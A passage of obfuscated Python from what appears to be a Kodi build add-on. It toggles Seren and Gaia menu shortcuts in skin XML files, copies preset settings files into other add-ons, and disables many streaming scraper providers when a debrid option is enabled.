		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1375
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1378
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1379
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1383
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1384
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1385
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1403
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1406
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1407
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1410
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1411
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1412
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1430
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1433
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1434
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1436
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1437
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1438
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1456
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1459
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1460
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1462
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1463
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1464
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1482
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1485
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1486
    O0O0O0OO000OOOO0O =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1489
    with open (O0O0O0OO000OOOO0O ,'r')as O00000O0O00O0OO00 :#line:1490
      OO00O000OOOOOOO00 =O00000O0O00O0OO00 .read ()#line:1491
    OO00O000OOOOOOO00 =OO00O000OOOOOOO00 .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''')#line:1509
    with open (O0O0O0OO000OOOO0O ,'w')as O00000O0O00O0OO00 :#line:1512
      O00000O0O00O0OO00 .write (OO00O000OOOOOOO00 )#line:1513
def rdbuildinstalloff ():#line:1516
    try :#line:1517
       OO000OOOO0O0000OO =ADDONPATH +"/resources/rdoff/victoryoff.xml"#line:1518
       O00O0000000O00O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1519
       copyfile (OO000OOOO0O0000OO ,O00O0000000O00O00 )#line:1521
       OO000OOOO0O0000OO =ADDONPATH +"/resources/rdoff/exodusreduxoff.xml"#line:1523
       O00O0000000O00O00 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1524
       copyfile (OO000OOOO0O0000OO ,O00O0000000O00O00 )#line:1526
       OO000OOOO0O0000OO =ADDONPATH +"/resources/rdoff/openscrapersoff.xml"#line:1528
       O00O0000000O00O00 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1529
       copyfile (OO000OOOO0O0000OO ,O00O0000000O00O00 )#line:1531
       OO000OOOO0O0000OO =ADDONPATH +"/resources/rdoff/Splash.png"#line:1534
       O00O0000000O00O00 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1535
       copyfile (OO000OOOO0O0000OO ,O00O0000000O00O00 )#line:1537
    except :#line:1539
       pass #line:1540
def rdbuildaddonON ():#line:1547
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1549
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1550
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1551
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1569
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1572
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1573
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1101.DATA.xml")#line:1577
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1578
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1579
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1597
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1600
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1601
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1605
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1606
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1607
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=moviesHome",return)</action>
	</shortcut>''')#line:1625
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1628
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1629
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-srtym-b.DATA.xml")#line:1633
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1634
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1635
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סרטים - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=movies&amp;type=movie&amp;kids=0",return)</action>
	</shortcut>''')#line:1653
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1656
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1657
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1660
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1661
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1662
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1680
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1683
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1684
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","x1102.DATA.xml")#line:1686
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1687
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1688
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1706
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1709
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1710
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1712
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1713
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1714
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Gaia</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/gaia.jpg</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.gaia/?action=shows&amp;type=show&amp;kids=0",return)</action>
	</shortcut>''')#line:1732
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1735
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1736
    O0OO000OOO00O0O00 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","script.skinshortcuts","b-sdrvt-b.DATA.xml")#line:1739
    with open (O0OO000OOO00O0O00 ,'r')as O0O00O0OOO0OOOO0O :#line:1740
      O0OO00O0O00O0OO0O =O0O00O0OOO0OOOO0O .read ()#line:1741
    O0OO00O0O00O0OO0O =O0OO00O0O00O0OO0O .replace ('''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
		<disabled>True</disabled>
	</shortcut>''','''	<shortcut>
		<defaultID />
		<label>סדרות - Seren</label>
		<label2>פריטים מותאמים אישית</label2>
		<icon>DefaultShortcut.png</icon>
		<thumb>special://home/Graphics/addons/seren2.png</thumb>
		<action>ActivateWindow(Videos,"plugin://plugin.video.seren/?action=showsHome",return)</action>
	</shortcut>''')#line:1759
    with open (O0OO000OOO00O0O00 ,'w')as O0O00O0OOO0OOOO0O :#line:1762
      O0O00O0OOO0OOOO0O .write (O0OO00O0O00O0OO0O )#line:1763
def rdbuildinstallON ():#line:1766
    try :#line:1768
       OO0OO00O00OO0OO0O =ADDONPATH +"/resources/rd/victory.xml"#line:1769
       OOO00OO000OOO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.allmoviesin')+"/settings.xml"#line:1770
       copyfile (OO0OO00O00OO0OO0O ,OOO00OO000OOO0OO0 )#line:1772
       OO0OO00O00OO0OO0O =ADDONPATH +"/resources/rd/exodusredux.xml"#line:1774
       OOO00OO000OOO0OO0 =xbmc .translatePath ('special://userdata/addon_data/plugin.video.exodusredux')+"/settings.xml"#line:1775
       copyfile (OO0OO00O00OO0OO0O ,OOO00OO000OOO0OO0 )#line:1777
       OO0OO00O00OO0OO0O =ADDONPATH +"/resources/rd/openscrapers.xml"#line:1779
       OOO00OO000OOO0OO0 =xbmc .translatePath ('special://userdata/addon_data/script.module.openscrapers')+"/settings.xml"#line:1780
       copyfile (OO0OO00O00OO0OO0O ,OOO00OO000OOO0OO0 )#line:1782
       OO0OO00O00OO0OO0O =ADDONPATH +"/resources/rd/Splash.png"#line:1785
       OOO00OO000OOO0OO0 =xbmc .translatePath ('special://home/media')+"/Splash.png"#line:1786
       copyfile (OO0OO00O00OO0OO0O ,OOO00OO000OOO0OO0 )#line:1788
    except :#line:1790
       pass #line:1791
def rdbuild ():#line:1801
	OOOO0O0OOO0O0OOOO =(ADDON .getSetting ("auto_rd"))#line:1802
	if OOOO0O0OOO0O0OOOO =='true':#line:1803
		O00O00OO0O0O0O000 =xbmcaddon .Addon ('plugin.video.allmoviesin')#line:1804
		O00O00OO0O0O0O000 .setSetting ('all_t','0')#line:1805
		O00O00OO0O0O0O000 .setSetting ('rd_menu_enable','false')#line:1806
		O00O00OO0O0O0O000 .setSetting ('magnet_bay','false')#line:1807
		O00O00OO0O0O0O000 .setSetting ('magnet_extra','false')#line:1808
		O00O00OO0O0O0O000 .setSetting ('rd_only','false')#line:1809
		O00O00OO0O0O0O000 .setSetting ('ftp','false')#line:1811
		O00O00OO0O0O0O000 .setSetting ('fp','false')#line:1812
		O00O00OO0O0O0O000 .setSetting ('filter_fp','false')#line:1813
		O00O00OO0O0O0O000 .setSetting ('fp_size_en','false')#line:1814
		O00O00OO0O0O0O000 .setSetting ('afdah','false')#line:1815
		O00O00OO0O0O0O000 .setSetting ('ap2s','false')#line:1816
		O00O00OO0O0O0O000 .setSetting ('cin','false')#line:1817
		O00O00OO0O0O0O000 .setSetting ('clv','false')#line:1818
		O00O00OO0O0O0O000 .setSetting ('cmv','false')#line:1819
		O00O00OO0O0O0O000 .setSetting ('dl20','false')#line:1820
		O00O00OO0O0O0O000 .setSetting ('esc','false')#line:1821
		O00O00OO0O0O0O000 .setSetting ('extra','false')#line:1822
		O00O00OO0O0O0O000 .setSetting ('film','false')#line:1823
		O00O00OO0O0O0O000 .setSetting ('fre','false')#line:1824
		O00O00OO0O0O0O000 .setSetting ('fxy','false')#line:1825
		O00O00OO0O0O0O000 .setSetting ('genv','false')#line:1826
		O00O00OO0O0O0O000 .setSetting ('getgo','false')#line:1827
		O00O00OO0O0O0O000 .setSetting ('gold','false')#line:1828
		O00O00OO0O0O0O000 .setSetting ('gona','false')#line:1829
		O00O00OO0O0O0O000 .setSetting ('hdmm','false')#line:1830
		O00O00OO0O0O0O000 .setSetting ('hdt','false')#line:1831
		O00O00OO0O0O0O000 .setSetting ('icy','false')#line:1832
		O00O00OO0O0O0O000 .setSetting ('ind','false')#line:1833
		O00O00OO0O0O0O000 .setSetting ('iwi','false')#line:1834
		O00O00OO0O0O0O000 .setSetting ('jen_free','false')#line:1835
		O00O00OO0O0O0O000 .setSetting ('kiss','false')#line:1836
		O00O00OO0O0O0O000 .setSetting ('lavin','false')#line:1837
		O00O00OO0O0O0O000 .setSetting ('los','false')#line:1838
		O00O00OO0O0O0O000 .setSetting ('m4u','false')#line:1839
		O00O00OO0O0O0O000 .setSetting ('mesh','false')#line:1840
		O00O00OO0O0O0O000 .setSetting ('mf','false')#line:1841
		O00O00OO0O0O0O000 .setSetting ('mkvc','false')#line:1842
		O00O00OO0O0O0O000 .setSetting ('mjy','false')#line:1843
		O00O00OO0O0O0O000 .setSetting ('hdonline','false')#line:1844
		O00O00OO0O0O0O000 .setSetting ('moviex','false')#line:1845
		O00O00OO0O0O0O000 .setSetting ('mpr','false')#line:1846
		O00O00OO0O0O0O000 .setSetting ('mvg','false')#line:1847
		O00O00OO0O0O0O000 .setSetting ('mvl','false')#line:1848
		O00O00OO0O0O0O000 .setSetting ('mvs','false')#line:1849
		O00O00OO0O0O0O000 .setSetting ('myeg','false')#line:1850
		O00O00OO0O0O0O000 .setSetting ('ninja','false')#line:1851
		O00O00OO0O0O0O000 .setSetting ('odb','false')#line:1852
		O00O00OO0O0O0O000 .setSetting ('ophd','false')#line:1853
		O00O00OO0O0O0O000 .setSetting ('pks','false')#line:1854
		O00O00OO0O0O0O000 .setSetting ('prf','false')#line:1855
		O00O00OO0O0O0O000 .setSetting ('put18','false')#line:1856
		O00O00OO0O0O0O000 .setSetting ('req','false')#line:1857
		O00O00OO0O0O0O000 .setSetting ('rftv','false')#line:1858
		O00O00OO0O0O0O000 .setSetting ('rltv','false')#line:1859
		O00O00OO0O0O0O000 .setSetting ('sc','false')#line:1860
		O00O00OO0O0O0O000 .setSetting ('seehd','false')#line:1861
		O00O00OO0O0O0O000 .setSetting ('showbox','false')#line:1862
		O00O00OO0O0O0O000 .setSetting ('shuid','false')#line:1863
		O00O00OO0O0O0O000 .setSetting ('sil_gh','false')#line:1864
		O00O00OO0O0O0O000 .setSetting ('spv','false')#line:1865
		O00O00OO0O0O0O000 .setSetting ('subs','false')#line:1866
		O00O00OO0O0O0O000 .setSetting ('tvs','false')#line:1867
		O00O00OO0O0O0O000 .setSetting ('tw','false')#line:1868
		O00O00OO0O0O0O000 .setSetting ('upto','false')#line:1869
		O00O00OO0O0O0O000 .setSetting ('vel','false')#line:1870
		O00O00OO0O0O0O000 .setSetting ('vex','false')#line:1871
		O00O00OO0O0O0O000 .setSetting ('vidc','false')#line:1872
		O00O00OO0O0O0O000 .setSetting ('w4hd','false')#line:1873
		O00O00OO0O0O0O000 .setSetting ('wav','false')#line:1874
		O00O00OO0O0O0O000 .setSetting ('wf','false')#line:1875
		O00O00OO0O0O0O000 .setSetting ('wse','false')#line:1876
		O00O00OO0O0O0O000 .setSetting ('wss','false')#line:1877
		O00O00OO0O0O0O000 .setSetting ('wsse','false')#line:1878
		O00O00OO0O0O0O000 =xbmcaddon .Addon ('plugin.video.speedmax')#line:1879
		O00O00OO0O0O0O000 .setSetting ('debrid.only','true')#line:1880
		O00O00OO0O0O0O000 .setSetting ('hosts.captcha','false')#line:1881
		O00O00OO0O0O0O000 =xbmcaddon .Addon ('script.module.civitasscrapers')#line:1882
		O00O00OO0O0O0O000 .setSetting ('provider.123moviehd','false')#line:1883
		O00O00OO0O0O0O000 .setSetting ('provider.300mbdownload','false')#line:1884
		O00O00OO0O0O0O000 .setSetting ('provider.alltube','false')#line:1885
		O00O00OO0O0O0O000 .setSetting ('provider.allucde','false')#line:1886
		O00O00OO0O0O0O000 .setSetting ('provider.animebase','false')#line:1887
		O00O00OO0O0O0O000 .setSetting ('provider.animeloads','false')#line:1888
		O00O00OO0O0O0O000 .setSetting ('provider.animetoon','false')#line:1889
		O00O00OO0O0O0O000 .setSetting ('provider.bnwmovies','false')#line:1890
		O00O00OO0O0O0O000 .setSetting ('provider.boxfilm','false')#line:1891
		O00O00OO0O0O0O000 .setSetting ('provider.bs','false')#line:1892
		O00O00OO0O0O0O000 .setSetting ('provider.cartoonhd','false')#line:1893
		O00O00OO0O0O0O000 .setSetting ('provider.cdahd','false')#line:1894
		O00O00OO0O0O0O000 .setSetting ('provider.cdax','false')#line:1895
		O00O00OO0O0O0O000 .setSetting ('provider.cine','false')#line:1896
		O00O00OO0O0O0O000 .setSetting ('provider.cinenator','false')#line:1897
		O00O00OO0O0O0O000 .setSetting ('provider.cmovieshdbz','false')#line:1898
		O00O00OO0O0O0O000 .setSetting ('provider.coolmoviezone','false')#line:1899
		O00O00OO0O0O0O000 .setSetting ('provider.ddl','false')#line:1900
		O00O00OO0O0O0O000 .setSetting ('provider.deepmovie','false')#line:1901
		O00O00OO0O0O0O000 .setSetting ('provider.ekinomaniak','false')#line:1902
		O00O00OO0O0O0O000 .setSetting ('provider.ekinotv','false')#line:1903
		O00O00OO0O0O0O000 .setSetting ('provider.filiser','false')#line:1904
		O00O00OO0O0O0O000 .setSetting ('provider.filmpalast','false')#line:1905
		O00O00OO0O0O0O000 .setSetting ('provider.filmwebbooster','false')#line:1906
		O00O00OO0O0O0O000 .setSetting ('provider.filmxy','false')#line:1907
		O00O00OO0O0O0O000 .setSetting ('provider.fmovies','false')#line:1908
		O00O00OO0O0O0O000 .setSetting ('provider.foxx','false')#line:1909
		O00O00OO0O0O0O000 .setSetting ('provider.freefmovies','false')#line:1910
		O00O00OO0O0O0O000 .setSetting ('provider.freeputlocker','false')#line:1911
		O00O00OO0O0O0O000 .setSetting ('provider.furk','false')#line:1912
		O00O00OO0O0O0O000 .setSetting ('provider.gamatotv','false')#line:1913
		O00O00OO0O0O0O000 .setSetting ('provider.gogoanime','false')#line:1914
		O00O00OO0O0O0O000 .setSetting ('provider.gowatchseries','false')#line:1915
		O00O00OO0O0O0O000 .setSetting ('provider.hackimdb','false')#line:1916
		O00O00OO0O0O0O000 .setSetting ('provider.hdfilme','false')#line:1917
		O00O00OO0O0O0O000 .setSetting ('provider.hdmto','false')#line:1918
		O00O00OO0O0O0O000 .setSetting ('provider.hdpopcorns','false')#line:1919
		O00O00OO0O0O0O000 .setSetting ('provider.hdstreams','false')#line:1920
		O00O00OO0O0O0O000 .setSetting ('provider.horrorkino','false')#line:1922
		O00O00OO0O0O0O000 .setSetting ('provider.iitv','false')#line:1923
		O00O00OO0O0O0O000 .setSetting ('provider.iload','false')#line:1924
		O00O00OO0O0O0O000 .setSetting ('provider.iwaatch','false')#line:1925
		O00O00OO0O0O0O000 .setSetting ('provider.kinodogs','false')#line:1926
		O00O00OO0O0O0O000 .setSetting ('provider.kinoking','false')#line:1927
		O00O00OO0O0O0O000 .setSetting ('provider.kinow','false')#line:1928
		O00O00OO0O0O0O000 .setSetting ('provider.kinox','false')#line:1929
		O00O00OO0O0O0O000 .setSetting ('provider.lichtspielhaus','false')#line:1930
		O00O00OO0O0O0O000 .setSetting ('provider.liomenoi','false')#line:1931
		O00O00OO0O0O0O000 .setSetting ('provider.magnetdl','false')#line:1934
		O00O00OO0O0O0O000 .setSetting ('provider.megapelistv','false')#line:1935
		O00O00OO0O0O0O000 .setSetting ('provider.movie2k-ac','false')#line:1936
		O00O00OO0O0O0O000 .setSetting ('provider.movie2k-ag','false')#line:1937
		O00O00OO0O0O0O000 .setSetting ('provider.movie2z','false')#line:1938
		O00O00OO0O0O0O000 .setSetting ('provider.movie4k','false')#line:1939
		O00O00OO0O0O0O000 .setSetting ('provider.movie4kis','false')#line:1940
		O00O00OO0O0O0O000 .setSetting ('provider.movieneo','false')#line:1941
		O00O00OO0O0O0O000 .setSetting ('provider.moviesever','false')#line:1942
		O00O00OO0O0O0O000 .setSetting ('provider.movietown','false')#line:1943
		O00O00OO0O0O0O000 .setSetting ('provider.mvrls','false')#line:1945
		O00O00OO0O0O0O000 .setSetting ('provider.netzkino','false')#line:1946
		O00O00OO0O0O0O000 .setSetting ('provider.odb','false')#line:1947
		O00O00OO0O0O0O000 .setSetting ('provider.openkatalog','false')#line:1948
		O00O00OO0O0O0O000 .setSetting ('provider.ororo','false')#line:1949
